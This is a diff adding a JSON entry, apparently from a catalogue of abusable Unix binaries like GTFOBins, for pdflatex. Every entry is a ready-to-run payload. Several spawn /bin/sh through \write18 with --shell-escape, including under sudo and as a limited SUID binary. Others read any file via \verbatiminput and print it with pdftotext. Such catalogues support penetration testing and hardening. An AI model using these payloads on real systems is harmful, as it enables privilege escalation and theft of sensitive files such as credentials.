@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The read file will be part of the output.",
+        "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{[file]}\\end{document}'\npdftotext article.pdf -\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "The read file will be part of the output.",
+        "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{[file]}\\end{document}'\npdftotext article.pdf -\n"
+      },
+      {
+        "code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ]
+  }
+}
